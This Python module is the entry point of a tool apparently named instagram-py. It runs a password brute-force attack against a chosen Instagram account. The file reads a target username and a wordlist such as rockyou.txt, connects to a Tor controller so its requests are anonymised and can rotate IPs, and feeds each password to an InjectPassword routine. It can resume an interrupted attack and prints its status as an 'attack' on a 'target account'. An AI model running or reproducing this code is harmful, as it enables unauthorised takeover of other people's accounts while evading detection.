# Instagram , Copyright (C) 2017 The Future Shell , DeathSec
# filename: __init__.py
# The traditional init file!

import argparse
from stem import Signal # to control tor server
from stem.control import Controller
from .getfile import *
from .constants import *
from .logger import *
from .colors import Fore , Back , Style , init
from .instagram_bot import InjectPassword

__version__ = appInfo['version']

init(autoreset=True) # set to automatically reset colors!

# set current proc globals

cmd_parser = argparse.ArgumentParser(
        epilog=Fore.BLUE + Style.BRIGHT +
        '''example: instagram-py -v instatestgod__ rockyou.txt'''
)
# nargs = '+' , makes them positional argument.
cmd_parser.add_argument('USERNAME' ,  # parse username from command line
                        type=str ,
                        help='username for Instagram account' ,
                        nargs = '+'
)

cmd_parser.add_argument('PASSWORD_LIST' , # parse path to password list file
                        type=str ,
                        default='./' ,
                        help='password list file to try with the given username.' ,
                        nargs='+'
)

cmd_parser.add_argument('--verbose' , # check if the user wants verbose mode enabled
                        '-v' ,
                        action='count' ,
                        help='Activate Verbose mode!'
)

def main():
    print_head(False) # print our appInfo!
    parsed = cmd_parser.parse_args() # lets get the input from the user!
    updateConfigWithCmdParsed(current_session , parsed) # updates all our required constants!

    current_session['start'] = datetime.now() # set the start time

    getPasswordList(current_session) # check and get password list file

    loadSavefile(current_session) # check if the user did a previous attack and resume it if the user wishes

    # open a new tor controller
    current_session['tor_controller'] = Controller.from_port(port = int(current_session['config']['tor']['control']['port']))
    # authenticate with tor
    try:
        if current_session['config']['tor']['control']['password'] == '':
            current_session['tor_controller'].authenticate()
        else:
            current_session['tor_controller'].authenticate(password = current_session['config']['tor']['control']['password'])
    except:
        report_err(app_error['tor_wrong_passwd']) # report and exit if anything goes wrong!

    # show user attack status!
    print(Fore.YELLOW + '[!] attack started: ' + Style.RESET_ALL + Fore.CYAN + str(current_session['start']))
    print(Style.BRIGHT + '[+] target account: ' + Style.RESET_ALL + Fore.CYAN + current_session['username'] )
    print(Style.BRIGHT + '[*] password list path: ' + Style.RESET_ALL + Fore.CYAN + current_session['passwordFile'])

    print(Style.BRIGHT + '[ ' + Fore.RED + 'ATTACK STATUS'+ Style.RESET_ALL + Style.BRIGHT +' ]')

    # resume the attack if possible
    current_line = 1
    if not current_session['resume']:
        resume_line = 0
    else:
        resume_line = int(current_session['save']['line-count'])

    # open the password list and start the attack!
    with open(current_session['passwordFile'] , encoding='utf-8' , errors ='ignore') as infile:
        for passwd in infile:
            if resume_line > current_line: # check if the user finished some passwords!
                current_line += 1
            else:
                current_session['password'] = passwd.rstrip()
                current_session['proceedWith'] = False
                while not current_session['proceedWith']:
                    InjectPassword(current_session , current_line)
                current_line += 1 # add line if we finished testing it!


    # if no password is found in the given password list then report error and exit
    report_err(app_error['no_pass_in_p_file']) # we are not lucky today!
